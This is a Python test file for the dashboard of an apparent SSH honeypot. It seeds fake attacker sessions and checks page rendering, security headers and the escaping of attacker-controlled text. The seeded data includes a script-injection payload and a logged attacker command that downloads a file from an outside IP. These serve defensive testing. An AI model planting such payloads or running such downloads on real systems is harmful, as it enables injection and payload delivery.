"""Dashboard tests against the `cruxtrap_test` database (skipped if PostgreSQL is down)."""
import json
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path

import asyncpg
import httpx
import pytest

from dashboard.app import create_app

ADMIN_DSN = "postgresql://cruxtrap:cruxtrap@127.0.0.1:55432/cruxtrap"
TEST_DSN = "postgresql://cruxtrap:cruxtrap@127.0.0.1:55432/cruxtrap_test"
SCHEMA = Path(__file__).resolve().parents[2] / "db" / "init.sql"
XSS = '<script>alert("pwned")</script>'


async def seed(conn) -> str:
    sid = uuid.uuid4()
    now = datetime.now(timezone.utc)
    await conn.execute("""INSERT INTO attackers (src_ip, first_seen, last_seen, total_connections, total_login_attempts,
                          total_sessions, total_commands, last_username, country_code, country, city)
                          VALUES ('203.0.113.7', $1, $1, 2, 3, 1, 3, $2, 'NL', 'Netherlands', 'Amsterdam')""", now, XSS)
    for i, (u, p, ok) in enumerate([("root", "123456", False), ("admin", XSS, False), ("root", "toor", True)]):
        await conn.execute("""INSERT INTO login_attempts (ts, src_ip, src_port, username, password, attempt, success)
                              VALUES ($1, '203.0.113.7', 50000, $2, $3, $4, $5)""", now + timedelta(seconds=i), u, p, i + 1, ok)
    await conn.execute("""INSERT INTO sessions (session_id, src_ip, src_port, username, password, started_at, ended_at,
                          duration_s, pty, term, command_count, end_reason, total_reward, epsilon, episode)
                          VALUES ($1, '203.0.113.7', 50000, 'root', 'toor', $2, $3, 42.0, true, 'xterm', 3, 'exit', 4.5, 0.29, 7)""",
                       sid, now, now + timedelta(seconds=42))
    rows = [(1, "uname -a", "recon", "early", "recon|early", "ALLOW", 2.5, True),
            (2, f"echo '{XSS}'", "benign", "early", "benign|early", "FAKE", 3.0, True),
            (3, "wget http://198.51.100.9/x", "download", "early", "download|early", "BLOCK", 0.0, False)]
    for seq, cmd, cat, ph, st, act, rew, cont in rows:
        await conn.execute("""INSERT INTO session_actions (session_id, seq, ts, command, category, phase, state, action,
                              epsilon, q_before, latency_ms, output_bytes, decoys_planted, reward, continued, next_state, q_after)
                              VALUES ($1,$2,$3,$4,$5,$6,$7,$8,0.3,$9::jsonb,1,10,$10,$11,$12,'x',$13::jsonb)""",
                           sid, seq, now + timedelta(seconds=seq * 5), cmd, cat, ph, st, act,
                           json.dumps({"ALLOW": 0.5, "FAKE": 0.1}), act == "FAKE", rew, cont,
                           json.dumps({"ALLOW": 0.5, "FAKE": 0.4, act: rew / 2}))
    return str(sid)


@pytest.fixture
async def client():
    try:
        admin = await asyncpg.connect(ADMIN_DSN, timeout=3)
    except (OSError, asyncpg.PostgresError):
        pytest.skip("PostgreSQL not running (docker compose up -d)")
    if not await admin.fetchval("SELECT 1 FROM pg_database WHERE datname = 'cruxtrap_test'"):
        await admin.execute("CREATE DATABASE cruxtrap_test")
    await admin.close()
    conn = await asyncpg.connect(TEST_DSN)
    await conn.execute("DROP TABLE IF EXISTS session_actions, sessions, login_attempts, attackers CASCADE")
    await conn.execute(SCHEMA.read_text(encoding="utf-8"))
    sid = await seed(conn)
    await conn.close()
    app = create_app(TEST_DSN)
    async with app.router.lifespan_context(app):
        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://test") as c:
            c.sid = sid
            yield c


@pytest.mark.parametrize("path", ["/", "/sessions", "/attackers", "/attackers/203.0.113.7", "/rl", "/healthz",
                                  "/sessions?q=203.0&min_commands=1", "/attackers?q=Nether", "/rl?bucket=1"])
async def test_pages_render(client, path):
    r = await client.get(path)
    assert r.status_code == 200, r.text[:500]


async def test_session_detail_and_replay(client):
    r = await client.get(f"/sessions/{client.sid}")
    assert r.status_code == 200
    assert "uname -a" in r.text and "BLOCK" in r.text and "Amsterdam" in r.text
    assert 'id="replay-data"' in r.text


async def test_api_stats(client):
    s = (await client.get("/api/stats")).json()
    assert (s["attackers"], s["sessions"], s["commands"], s["login_attempts"]) == (1, 1, 3, 3)
    assert s["epsilon"] == pytest.approx(0.29) and s["episodes"] == 7
    assert s["decoy_reads"] == 0  # the FAKE row is 'benign', not cred_access


async def test_attacker_controlled_text_is_escaped(client):
    """Commands, usernames and passwords come from attackers; none may render as markup."""
    for path in ("/", f"/sessions/{client.sid}", "/attackers", "/attackers/203.0.113.7"):
        body = (await client.get(path)).text
        assert XSS not in body, f"unescaped payload on {path}"
    replay = (await client.get(f"/sessions/{client.sid}")).text
    # tojson must neutralise </script> inside the JSON data block
    assert "\\u003cscript\\u003e" in replay


async def test_security_headers(client):
    r = await client.get("/")
    assert "script-src 'self'" in r.headers["content-security-policy"]
    assert r.headers["x-content-type-options"] == "nosniff"


async def test_q_table_reconstructed_from_updates(client):
    body = (await client.get("/rl")).text
    assert "★" in body and "download" in body


@pytest.mark.parametrize("path", ["/sessions/not-a-uuid", f"/sessions/{uuid.uuid4()}", "/attackers/999.1.1.1",
                                  "/attackers/198.51.100.200"])
async def test_not_found(client, path):
    r = await client.get(path)
    assert r.status_code == 404 and "back to overview" in r.text


async def test_empty_database_renders(client):
    conn = await asyncpg.connect(TEST_DSN)
    await conn.execute("TRUNCATE session_actions, sessions, login_attempts, attackers")
    await conn.close()
    for path in ("/", "/sessions", "/attackers", "/rl"):
        assert (await client.get(path)).status_code == 200
